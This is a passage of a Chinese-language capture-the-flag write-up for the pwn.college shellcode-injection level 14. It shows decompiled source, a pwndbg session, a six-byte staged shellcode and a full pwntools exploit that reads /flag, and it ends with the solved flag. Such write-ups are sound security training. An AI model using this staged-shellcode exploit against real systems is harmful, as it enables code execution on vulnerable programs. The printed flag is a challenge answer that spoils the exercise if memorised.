    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x2C0A3000, 0x1000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)738865152 )
    __assert_fail("shellcode == (void *)0x2c0a3000", "/challenge/babyshell-level-14.c", 0x62u, "main");
  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x2C0A3000);
  puts("Reading 0x6 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 6uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-14.c", 0x67u, "main");
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_24A5);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

6 bytes，看似好像是一件不可能完成的任务，butttt，如果你尝试动态调试会就会发现，`rax` 的值正好可以用于 `syscall` 来调用 `read`；`rdx` 的值正好可以用做 `read` 的第二个参数，指定 `buf` 地址；`rsi` 的值足够大，正好用作 `read` 的第三个参数，指定输入大小。

```asm wrap=false showLineNumbers=false ins={177, 180, 182, 231, 234, 236} del={137} collapse={3-133, 141-142, 147-173, 199-224, 253-275}
pwndbg> disass main
Dump of assembler code for function main:
   0x0000000000001547 <+0>: endbr64
   0x000000000000154b <+4>: push   rbp
   0x000000000000154c <+5>: mov    rbp,rsp
   0x000000000000154f <+8>: sub    rsp,0x40
   0x0000000000001553 <+12>: mov    DWORD PTR [rbp-0x24],edi
   0x0000000000001556 <+15>: mov    QWORD PTR [rbp-0x30],rsi
   0x000000000000155a <+19>: mov    QWORD PTR [rbp-0x38],rdx
   0x000000000000155e <+23>: mov    rax,QWORD PTR [rip+0x2abb]        # 0x4020 <stdin@@GLIBC_2.2.5>
   0x0000000000001565 <+30>: mov    ecx,0x0
   0x000000000000156a <+35>: mov    edx,0x2
   0x000000000000156f <+40>: mov    esi,0x0
   0x0000000000001574 <+45>: mov    rdi,rax
   0x0000000000001577 <+48>: call   0x11d0 <setvbuf@plt>
   0x000000000000157c <+53>: mov    rax,QWORD PTR [rip+0x2a8d]        # 0x4010 <stdout@@GLIBC_2.2.5>
   0x0000000000001583 <+60>: mov    ecx,0x0
   0x0000000000001588 <+65>: mov    edx,0x2
   0x000000000000158d <+70>: mov    esi,0x0
   0x0000000000001592 <+75>: mov    rdi,rax
   0x0000000000001595 <+78>: call   0x11d0 <setvbuf@plt>
   0x000000000000159a <+83>: lea    rdi,[rip+0xc24]        # 0x21c5
   0x00000000000015a1 <+90>: call   0x1130 <puts@plt>
   0x00000000000015a6 <+95>: mov    rax,QWORD PTR [rbp-0x30]
   0x00000000000015aa <+99>: mov    rax,QWORD PTR [rax]
   0x00000000000015ad <+102>: mov    rsi,rax
   0x00000000000015b0 <+105>: lea    rdi,[rip+0xc12]        # 0x21c9
   0x00000000000015b7 <+112>: mov    eax,0x0
   0x00000000000015bc <+117>: call   0x1170 <printf@plt>
   0x00000000000015c1 <+122>: lea    rdi,[rip+0xbfd]        # 0x21c5
   0x00000000000015c8 <+129>: call   0x1130 <puts@plt>
   0x00000000000015cd <+134>: mov    edi,0xa
   0x00000000000015d2 <+139>: call   0x1120 <putchar@plt>
   0x00000000000015d7 <+144>: lea    rdi,[rip+0xc02]        # 0x21e0
   0x00000000000015de <+151>: call   0x1130 <puts@plt>
   0x00000000000015e3 <+156>: lea    rdi,[rip+0xc76]        # 0x2260
   0x00000000000015ea <+163>: call   0x1130 <puts@plt>
   0x00000000000015ef <+168>: lea    rdi,[rip+0xce2]        # 0x22d8
   0x00000000000015f6 <+175>: call   0x1130 <puts@plt>
   0x00000000000015fb <+180>: lea    rdi,[rip+0xd4e]        # 0x2350
   0x0000000000001602 <+187>: call   0x1130 <puts@plt>
   0x0000000000001607 <+192>: mov    DWORD PTR [rbp-0x14],0x3
   0x000000000000160e <+199>: jmp    0x161e <main+215>
   0x0000000000001610 <+201>: mov    eax,DWORD PTR [rbp-0x14]
   0x0000000000001613 <+204>: mov    edi,eax
   0x0000000000001615 <+206>: call   0x11a0 <close@plt>
   0x000000000000161a <+211>: add    DWORD PTR [rbp-0x14],0x1
   0x000000000000161e <+215>: cmp    DWORD PTR [rbp-0x14],0x270f
   0x0000000000001625 <+222>: jle    0x1610 <main+201>
   0x0000000000001627 <+224>: mov    rax,QWORD PTR [rbp-0x30]
   0x000000000000162b <+228>: mov    QWORD PTR [rbp-0x10],rax
   0x000000000000162f <+232>: jmp    0x165c <main+277>
   0x0000000000001631 <+234>: mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000001635 <+238>: mov    rax,QWORD PTR [rax]
   0x0000000000001638 <+241>: mov    rdi,rax
   0x000000000000163b <+244>: call   0x1150 <strlen@plt>
   0x0000000000001640 <+249>: mov    rdx,rax
   0x0000000000001643 <+252>: mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000001647 <+256>: mov    rax,QWORD PTR [rax]
   0x000000000000164a <+259>: mov    esi,0x0
   0x000000000000164f <+264>: mov    rdi,rax
   0x0000000000001652 <+267>: call   0x1190 <memset@plt>
   0x0000000000001657 <+272>: add    QWORD PTR [rbp-0x10],0x8
   0x000000000000165c <+277>: mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000001660 <+281>: mov    rax,QWORD PTR [rax]
   0x0000000000001663 <+284>: test   rax,rax
   0x0000000000001666 <+287>: jne    0x1631 <main+234>
   0x0000000000001668 <+289>: mov    rax,QWORD PTR [rbp-0x38]
   0x000000000000166c <+293>: mov    QWORD PTR [rbp-0x8],rax
   0x0000000000001670 <+297>: jmp    0x169d <main+342>
   0x0000000000001672 <+299>: mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000001676 <+303>: mov    rax,QWORD PTR [rax]
   0x0000000000001679 <+306>: mov    rdi,rax
   0x000000000000167c <+309>: call   0x1150 <strlen@plt>
   0x0000000000001681 <+314>: mov    rdx,rax
   0x0000000000001684 <+317>: mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000001688 <+321>: mov    rax,QWORD PTR [rax]
   0x000000000000168b <+324>: mov    esi,0x0
   0x0000000000001690 <+329>: mov    rdi,rax
   0x0000000000001693 <+332>: call   0x1190 <memset@plt>
   0x0000000000001698 <+337>: add    QWORD PTR [rbp-0x8],0x8
   0x000000000000169d <+342>: mov    rax,QWORD PTR [rbp-0x8]
   0x00000000000016a1 <+346>: mov    rax,QWORD PTR [rax]
   0x00000000000016a4 <+349>: test   rax,rax
   0x00000000000016a7 <+352>: jne    0x1672 <main+299>
   0x00000000000016a9 <+354>: mov    r9d,0x0
   0x00000000000016af <+360>: mov    r8d,0x0
   0x00000000000016b5 <+366>: mov    ecx,0x22
   0x00000000000016ba <+371>: mov    edx,0x7
   0x00000000000016bf <+376>: mov    esi,0x1000
   0x00000000000016c4 <+381>: mov    edi,0x2c0a3000
   0x00000000000016c9 <+386>: call   0x1160 <mmap@plt>
   0x00000000000016ce <+391>: mov    QWORD PTR [rip+0x2963],rax        # 0x4038 <shellcode>
   0x00000000000016d5 <+398>: mov    rax,QWORD PTR [rip+0x295c]        # 0x4038 <shellcode>
   0x00000000000016dc <+405>: cmp    rax,0x2c0a3000
   0x00000000000016e2 <+411>: je     0x1703 <main+444>
   0x00000000000016e4 <+413>: lea    rcx,[rip+0xdde]        # 0x24c9 <__PRETTY_FUNCTION__.25265>
   0x00000000000016eb <+420>: mov    edx,0x62
   0x00000000000016f0 <+425>: lea    rsi,[rip+0xcc9]        # 0x23c0
   0x00000000000016f7 <+432>: lea    rdi,[rip+0xce2]        # 0x23e0
   0x00000000000016fe <+439>: call   0x1180 <__assert_fail@plt>
   0x0000000000001703 <+444>: mov    rax,QWORD PTR [rip+0x292e]        # 0x4038 <shellcode>
   0x000000000000170a <+451>: mov    rsi,rax
   0x000000000000170d <+454>: lea    rdi,[rip+0xcec]        # 0x2400
   0x0000000000001714 <+461>: mov    eax,0x0
   0x0000000000001719 <+466>: call   0x1170 <printf@plt>
   0x000000000000171e <+471>: lea    rdi,[rip+0xd0b]        # 0x2430
   0x0000000000001725 <+478>: call   0x1130 <puts@plt>
   0x000000000000172a <+483>: mov    rax,QWORD PTR [rip+0x2907]        # 0x4038 <shellcode>
   0x0000000000001731 <+490>: mov    edx,0x6
   0x0000000000001736 <+495>: mov    rsi,rax
   0x0000000000001739 <+498>: mov    edi,0x0
   0x000000000000173e <+503>: call   0x11b0 <read@plt>
   0x0000000000001743 <+508>: mov    QWORD PTR [rip+0x28e6],rax        # 0x4030 <shellcode_size>
   0x000000000000174a <+515>: mov    rax,QWORD PTR [rip+0x28df]        # 0x4030 <shellcode_size>
   0x0000000000001751 <+522>: test   rax,rax
   0x0000000000001754 <+525>: jne    0x1775 <main+558>
   0x0000000000001756 <+527>: lea    rcx,[rip+0xd6c]        # 0x24c9 <__PRETTY_FUNCTION__.25265>
   0x000000000000175d <+534>: mov    edx,0x67
   0x0000000000001762 <+539>: lea    rsi,[rip+0xc57]        # 0x23c0
   0x0000000000001769 <+546>: lea    rdi,[rip+0xcdf]        # 0x244f
   0x0000000000001770 <+553>: call   0x1180 <__assert_fail@plt>
   0x0000000000001775 <+558>: lea    rdi,[rip+0xcec]        # 0x2468
   0x000000000000177c <+565>: call   0x1130 <puts@plt>
   0x0000000000001781 <+570>: mov    rdx,QWORD PTR [rip+0x28a8]        # 0x4030 <shellcode_size>
   0x0000000000001788 <+577>: mov    rax,QWORD PTR [rip+0x28a9]        # 0x4038 <shellcode>
   0x000000000000178f <+584>: mov    rsi,rdx
   0x0000000000001792 <+587>: mov    rdi,rax
   0x0000000000001795 <+590>: call   0x12e9 <print_disassembly>
   0x000000000000179a <+595>: lea    rdi,[rip+0xd04]        # 0x24a5
   0x00000000000017a1 <+602>: call   0x1130 <puts@plt>
   0x00000000000017a6 <+607>: lea    rdi,[rip+0xcf9]        # 0x24a6
   0x00000000000017ad <+614>: call   0x1130 <puts@plt>
   0x00000000000017b2 <+619>: mov    rax,QWORD PTR [rip+0x287f]        # 0x4038 <shellcode>
   0x00000000000017b9 <+626>: mov    rdx,rax
   0x00000000000017bc <+629>: mov    eax,0x0
   0x00000000000017c1 <+634>: call   rdx
   0x00000000000017c3 <+636>: lea    rdi,[rip+0xcf2]        # 0x24bc
   0x00000000000017ca <+643>: call   0x1130 <puts@plt>
   0x00000000000017cf <+648>: mov    eax,0x0
   0x00000000000017d4 <+653>: leave
   0x00000000000017d5 <+654>: ret
End of assembler dump.
pwndbg> b *main+634
Breakpoint 1 at 0x17c1
pwndbg> r
Starting program: /home/cub3y0nd/Projects/pwn.college/babyshell-level-14
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
###
### Welcome to /home/cub3y0nd/Projects/pwn.college/babyshell-level-14!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x2c0a3000!
Reading 0x6 bytes from stdin.


This challenge is about to execute the following shellcode:

ERROR: Failed to disassemble shellcode! Bytes are:

      Address      |                      Bytes
--------------------------------------------------------------------
0x000000002c0a3000 | 0a 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

Executing shellcode!


Breakpoint 1, 0x0000614116b287c1 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────
 RAX  0
 RBX  0x7ffd5ec85d08 —▸ 0x7ffd5ec86c08 ◂— 0
 RCX  0x71ac56b1b7a4 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x2c0a3000 ◂— 0xa /* '\n' */
 RDI  0x71ac56bf8710 ◂— 0
 RSI  0x71ac56bf7643 (_IO_2_1_stdout_+131) ◂— 0xbf8710000000000a /* '\n' */
 R8   0x614119b31010 ◂— 0
 R9   7
 R10  0x614119b312a0 ◂— 0x614119b31
 R11  0x202
 R12  1
 R13  0
 R14  0x71ac573d0000 (_rtld_global) —▸ 0x71ac573d12e0 —▸ 0x614116b27000 ◂— 0x10102464c457f
 R15  0
 RBP  0x7ffd5ec85be0 —▸ 0x7ffd5ec85c80 —▸ 0x7ffd5ec85ce0 ◂— 0
 RSP  0x7ffd5ec85ba0 ◂— 0
 RIP  0x614116b287c1 (main+634) ◂— call rdx
──────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────
 ► 0x614116b287c1 <main+634>              call   rdx                         <0x2c0a3000>

   0x614116b287c3 <main+636>              lea    rdi, [rip + 0xcf2]     RDI => 0x614116b294bc ◂— '### Goodbye!'
   0x614116b287ca <main+643>              call   puts@plt                    <puts@plt>

   0x614116b287cf <main+648>              mov    eax, 0                      EAX => 0
   0x614116b287d4 <main+653>              leave
   0x614116b287d5 <main+654>              ret

   0x614116b287d6                         nop    word ptr cs:[rax + rax]
   0x614116b287e0 <__libc_csu_init>       endbr64
   0x614116b287e4 <__libc_csu_init+4>     push   r15
   0x614116b287e6 <__libc_csu_init+6>     lea    r15, [rip + 0x2553]         R15 => 0x614
116b2ad40 (__init_array_start) —▸ 0x614116b282e0 (frame_dummy) ◂— endbr64
   0x614116b287ed <__libc_csu_init+13>    push   r14
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp 0x7ffd5ec85ba0 ◂— 0
01:0008│-038 0x7ffd5ec85ba8 —▸ 0x7ffd5ec85d18 —▸ 0x7ffd5ec86c3f ◂— 0
02:0010│-030 0x7ffd5ec85bb0 —▸ 0x7ffd5ec85d08 —▸ 0x7ffd5ec86c08 ◂— 0
03:0018│-028 0x7ffd5ec85bb8 ◂— 0x100000000
04:0020│-020 0x7ffd5ec85bc0 ◂— 0
05:0028│-018 0x7ffd5ec85bc8 ◂— 0x2710573b83e0
06:0030│-010 0x7ffd5ec85bd0 —▸ 0x7ffd5ec85d10 ◂— 0
07:0038│-008 0x7ffd5ec85bd8 —▸ 0x7ffd5ec85df0 ◂— 0
──────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────
 ► 0   0x614116b287c1 main+634
   1   0x71ac56a34e08
   2   0x71ac56a34ecc __libc_start_main+140
   3   0x614116b2822e _start+46
─────────────────────────────────────────────────────────────────────────────────────────
pwndbg> ni

Program received signal SIGSEGV, Segmentation fault.
0x000000002c0a3000 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
 RAX  0
 RBX  0x7ffd5ec85d08 —▸ 0x7ffd5ec86c08 ◂— 0
 RCX  0x71ac56b1b7a4 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x2c0a3000 ◂— 0xa /* '\n' */
 RDI  0x71ac56bf8710 ◂— 0
 RSI  0x71ac56bf7643 (_IO_2_1_stdout_+131) ◂— 0xbf8710000000000a /* '\n' */
 R8   0x614119b31010 ◂— 0
 R9   7
 R10  0x614119b312a0 ◂— 0x614119b31
 R11  0x202
 R12  1
 R13  0
 R14  0x71ac573d0000 (_rtld_global) —▸ 0x71ac573d12e0 —▸ 0x614116b27000 ◂— 0x10102464c457f
 R15  0
 RBP  0x7ffd5ec85be0 —▸ 0x7ffd5ec85c80 —▸ 0x7ffd5ec85ce0 ◂— 0
*RSP  0x7ffd5ec85b98 —▸ 0x614116b287c3 (main+636) ◂— lea rdi, [rip + 0xcf2]
*RIP  0x2c0a3000 ◂— 0xa /* '\n' */
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x2c0a3000    or     al, byte ptr [rax]
   0x2c0a3002    add    byte ptr [rax], al
   0x2c0a3004    add    byte ptr [rax], al
   0x2c0a3006    add    byte ptr [rax], al
   0x2c0a3008    add    byte ptr [rax], al
   0x2c0a300a    add    byte ptr [rax], al
   0x2c0a300c    add    byte ptr [rax], al
   0x2c0a300e    add    byte ptr [rax], al
   0x2c0a3010    add    byte ptr [rax], al
   0x2c0a3012    add    byte ptr [rax], al
   0x2c0a3014    add    byte ptr [rax], al
─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffd5ec85b98 —▸ 0x614116b287c3 (main+636) ◂— lea rdi, [rip + 0xcf2]
01:0008│-040 0x7ffd5ec85ba0 ◂— 0
02:0010│-038 0x7ffd5ec85ba8 —▸ 0x7ffd5ec85d18 —▸ 0x7ffd5ec86c3f ◂— 0
03:0018│-030 0x7ffd5ec85bb0 —▸ 0x7ffd5ec85d08 —▸ 0x7ffd5ec86c08 ◂— 0
04:0020│-028 0x7ffd5ec85bb8 ◂— 0x100000000
05:0028│-020 0x7ffd5ec85bc0 ◂— 0
06:0030│-018 0x7ffd5ec85bc8 ◂— 0x2710573b83e0
07:0038│-010 0x7ffd5ec85bd0 —▸ 0x7ffd5ec85d10 ◂— 0
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0       0x2c0a3000
   1   0x614116b287c3 main+636
   2   0x71ac56a34e08
   3   0x71ac56a34ecc __libc_start_main+140
   4   0x614116b2822e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
```

来来来，我们看看 stage_1 的 shellcode 编译出来占多少字节：

```asm
.global _start
.intel_syntax noprefix

_start:
  xor edi, edi
  xchg esi, edx
  syscall
```

```asm
0000000000401000 <_start>:
  401000:       31 ff                   xor    edi,edi
  401002:       87 d6                   xchg   esi,edx
  401004:       0f 05                   syscall
```

GG 正好 6 bytes！笑不动了哈哈哈。

现在，有了 stage_1 的辅助，stage_2 该怎么办不用多说了吧 xD

唯一有一点需要注意的就是执行 stage_2 之前应该使用 `nop` 填充 stage_1 所用的所有指令位，这样才能确保从正确的地方接着执行，因为 `rip` 的值一直在改变。

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote, shellcraft

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-14"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload(stage):
    stage_1 = """
    xor edi, edi
    xchg esi, edx
    syscall
    """

    stage_2 = shellcraft.nop() * len(asm(stage_1))
    stage_2 += shellcraft.cat("/flag")

    if stage == 1:
        return asm(stage_1)
    elif stage == 2:
        return asm(stage_2)
    else:
        log.failure("Unknown stage number.")


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload(1)

        send_payload(target, payload)

        payload = construct_payload(2)

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{0PaZanWijSYussIikuZaDrCAj1-.0FMzIDL5cTNxgzW}`

# 后记

没想到时隔三天又要写后记了。这章 3 天就打完了，爽快！

~Shellcode Injection 应该是最简单的一章了，不接受反驳。~

Well. 接下来我想嗨几天，虽然不知道可以干什么，但是我清楚的知道我这个小苦逼之后的 roadmap 是刷 ROP -> FmtStr ……
